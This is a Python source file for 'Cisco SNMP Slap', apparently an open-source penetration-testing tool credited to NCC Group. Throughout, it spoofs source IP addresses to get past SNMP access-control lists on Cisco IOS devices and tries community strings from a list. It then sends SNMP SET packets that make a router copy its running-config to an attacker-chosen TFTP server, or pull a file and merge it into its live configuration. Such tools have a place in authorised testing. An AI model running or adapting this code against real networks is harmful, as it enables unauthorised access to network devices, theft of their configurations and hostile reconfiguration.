#!/usr/bin/env python3
#    Cisco SNMP Slap v1.0.0
#    Released as open source by NCC Group Plc - http://www.nccgroup.com/
#    Developed by Darren McDonald, darren.mcdonald@nccgroup.com
#    http://www.github.com/nccgroup/

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

import argparse
import os.path
import random
import socket
import struct
import sys
from time import sleep

from scapy.layers.snmp import SNMP, SNMPset, SNMPvarbind
from scapy.asn1.asn1 import ASN1_OID, ASN1_IPADDRESS
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send

VERSION = "v1.1.0"


def send_snmp(layer34, community, tftpserver, filename="cisco-config.txt", push=False):
    """Send 7 SNMP SET packets to trigger a Cisco IOS config TFTP transfer.

    pull (default): device uploads running-config to TFTP server
    push:           device pulls file from TFTP server and merges into running-config
    """
    base = "1.3.6.1.4.1.9.9.96.1.1.1.1"
    row = 113 if push else 112
    src_type = 1 if push else 4  # networkFile when pushing, runningConfig when pulling
    dst_type = 4 if push else 1  # runningConfig when pushing, networkFile when pulling
    s1 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.14.{row}"), value=6)]))
    s2 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.2.{row}"), value=1)]))
    s3 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.3.{row}"), value=src_type)]))
    s4 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.4.{row}"), value=dst_type)]))
    s5 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.5.{row}"), value=ASN1_IPADDRESS(tftpserver))]))
    s6 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.6.{row}"), value=filename)]))
    s7 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.14.{row}"), value=1)]))
    send(layer34 / s1, verbose=0)
    send(layer34 / s2, verbose=0)
    send(layer34 / s3, verbose=0)
    send(layer34 / s4, verbose=0)
    send(layer34 / s5, verbose=0)
    send(layer34 / s6, verbose=0)
    send(layer34 / s7, verbose=0)


def check_file(outpath):
    """Check if the TFTP config file has arrived. Returns True on success."""
    if outpath and os.path.isfile(outpath):
        print("Success!")
        return True
    return False


def wait_and_check(outpath):
    """Wait 10 seconds for a final TFTP push, then check for the file."""
    print("Waiting 10 seconds to see if the last requests cause a TFTP push")
    sleep(10)
    check_file(outpath)


def generate_random_ip(srcip, srcmask):
    """Generate a randomized source IP by applying a random value through the mask."""
    src_long = struct.unpack("!L", socket.inet_aton(srcip))[0]
    mask_long = struct.unpack("!L", socket.inet_aton(srcmask))[0]
    rand_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    rand_long = struct.unpack("!L", socket.inet_aton(rand_ip))[0]
    masked = rand_long & mask_long
    result = src_long ^ masked
    return socket.inet_ntoa(struct.pack("!L", result))


def run_single(srcip, dstip, communities, tftpserver, outpath, verbose,
                push=False, filename="cisco-config.txt"):
    """Single target IP, one or more community strings."""
    layer34 = IP(src=srcip, dst=dstip) / UDP(sport=161, dport=161)
    for c in communities:
        if verbose:
            print(f"{dstip} /  {c}")
        send_snmp(layer34, c, tftpserver, filename=filename, push=push)
        if not push and outpath and check_file(outpath):
            return


def run_randmask(srcip, dstip, srcmask, communities, tftpserver, outpath, verbose,
                  push=False, filename="cisco-config.txt"):
    """Random IP sweep within mask, one or more community strings."""
    while True:
        tmpip = generate_random_ip(srcip, srcmask)
        layer34 = IP(src=tmpip, dst=dstip) / UDP(sport=161, dport=161)
        for c in communities:
            if verbose:
                print(f"{tmpip} /  {c}")
            else:
                print(tmpip)
            send_snmp(layer34, c, tftpserver, filename=filename, push=push)
            if not push and check_file(outpath):
                return


def run_seqmask(srcip, dstip, srcmask, communities, tftpserver, outpath, verbose,
                 push=False, filename="cisco-config.txt"):
    """Sequential IP sweep within mask, one or more community strings."""
    src_long = struct.unpack("!L", socket.inet_aton(srcip))[0]
    mask_long = struct.unpack("!L", socket.inet_aton(srcmask))[0]
    seq_long = 0
    while True:
        if seq_long | mask_long == mask_long:
            tmp_long = src_long ^ seq_long
            tmpip = socket.inet_ntoa(struct.pack("!L", tmp_long))
            layer34 = IP(src=tmpip, dst=dstip) / UDP(sport=161, dport=161)
            for c in communities:
                if verbose:
                    print(f"{tmpip} /  {c}")
                else:
                    print(tmpip)
                send_snmp(layer34, c, tftpserver, filename=filename, push=push)
                if not push and check_file(outpath):
                    return
        if seq_long < mask_long:
            seq_long += 1
        else:
            break
    if not push:
        if check_file(outpath):
            return
        wait_and_check(outpath)


def build_parser():
    """Build the argparse parser with all 6 subcommands."""
    parser = argparse.ArgumentParser(
        prog="slap.py",
        description=f"Cisco SNMP Slap {VERSION} - Cisco SNMP ACL bypass via IP spoofing",
    )
    subparsers = parser.add_subparsers(dest="mode", required=True)

    def add_common(sub, community_is_file=False):
        if community_is_file:
            sub.add_argument("community_file", metavar="community-string-file")
        else:
            sub.add_argument("community", metavar="community-string")
        sub.add_argument("tftpserver", metavar="tftp-server-ip")
        sub.add_argument("srcip", metavar="source-ip")
        sub.add_argument("--push", action="store_true", default=False,
                         help="Push config TO device (merge into running-config) instead of pulling")
        sub.add_argument("--filename", metavar="tftp-filename", default="cisco-config.txt",
                         help="Filename on TFTP server (default: cisco-config.txt)")

    def add_mask_args(sub):
        sub.add_argument("srcmask", metavar="source-mask")
        sub.add_argument("dstip", metavar="destination-ip")
        sub.add_argument("tftproot", metavar="tftp-root-path", nargs="?", default=None)

    # single
    p = subparsers.add_parser("single", help="Single IP, single community string")
    add_common(p)
    p.add_argument("dstip", metavar="destination-ip")

    # single_l
    p = subparsers.add_parser("single_l", help="Single IP, community string list")
    add_common(p, community_is_file=True)
    p.add_argument("dstip", metavar="destination-ip")

    # randmask
    p = subparsers.add_parser("randmask", help="Random IP sweep, single community string")
    add_common(p)
    add_mask_args(p)

    # randmask_l
    p = subparsers.add_parser("randmask_l", help="Random IP sweep, community string list")
    add_common(p, community_is_file=True)
    add_mask_args(p)

    # seqmask
    p = subparsers.add_parser("seqmask", help="Sequential IP sweep, single community string")
    add_common(p)
    add_mask_args(p)

    # seqmask_l
    p = subparsers.add_parser("seqmask_l", help="Sequential IP sweep, community string list")
    add_common(p, community_is_file=True)
    add_mask_args(p)

    return parser


def main():
    print(f"Cisco SNMP Slap, {VERSION}")
    print("Darren McDonald, darren.mcdonald@nccgroup.com")

    parser = build_parser()
    args = parser.parse_args()

    # Load community strings
    if args.mode.endswith("_l"):
        with open(args.community_file) as f:
            communities = [line.strip() for line in f if line.strip()]
    else:
        communities = [args.community]

    # Echo configuration
    if args.push:
        print(f"Mode:              PUSH (merge config to device)")
        print(f"TFTP Filename:     {args.filename}")
    else:
        print(f"Mode:              PULL (download config from device)")
    if args.mode.endswith("_l"):
        print(f"Community File:    {args.community_file}")
    else:
        print(f"Community String:  {args.community}")
    print(f"TFTP Server IP  :  {args.tftpserver}")
    print(f"Source IP:         {args.srcip}")
    if hasattr(args, "srcmask"):
        print(f"Source Mask:       {args.srcmask}")
    print(f"Destination IP:    {args.dstip}")

    # Determine output path (pull mode only)
    outpath = ""
    if not args.push and hasattr(args, "tftproot") and args.tftproot:
        outpath = args.tftproot + os.sep + args.filename
        print(f"TFTP Root Path:    {outpath}")

    if args.mode.endswith("_l"):
        print(f"Community strings loaded: {communities}")

    # Check for existing output file (pull mode only)
    if not args.push and outpath and os.path.isfile(outpath):
        print("Target file already exists, delete or move the following file and try again")
        print(outpath)
        sys.exit(1)

    # Dispatch to mode handler
    base_mode = args.mode.replace("_l", "")
    verbose = args.mode.endswith("_l")

    if base_mode == "single":
        run_single(args.srcip, args.dstip, communities, args.tftpserver, outpath, verbose,
                   push=args.push, filename=args.filename)
    elif base_mode == "randmask":
        run_randmask(args.srcip, args.dstip, args.srcmask, communities, args.tftpserver, outpath, verbose,
                     push=args.push, filename=args.filename)
    elif base_mode == "seqmask":
        run_seqmask(args.srcip, args.dstip, args.srcmask, communities, args.tftpserver, outpath, verbose,
                    push=args.push, filename=args.filename)


if __name__ == "__main__":
    main()
